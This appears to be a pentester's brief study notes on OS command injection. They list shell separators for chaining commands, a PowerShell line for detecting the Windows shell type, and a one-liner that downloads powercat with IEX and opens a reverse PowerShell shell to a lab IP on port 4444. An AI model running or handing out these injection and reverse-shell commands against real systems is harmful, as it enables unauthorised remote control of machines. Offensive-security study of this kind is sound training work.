
## OS Command Injection


Many times web application needs to interact to OS and developers directly takes users input, sanitize it and prepare it to interact with OS.
This can lead to security issues of OS command injection.


Note: we can use `;`, `&&`, `&` to pass other command after command if required. There could be a more way


```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
This cmd can be useful to identify shell type in windows


For downloading file in PowerShell
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```


we have powercat implementation of nc in 
```
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
```



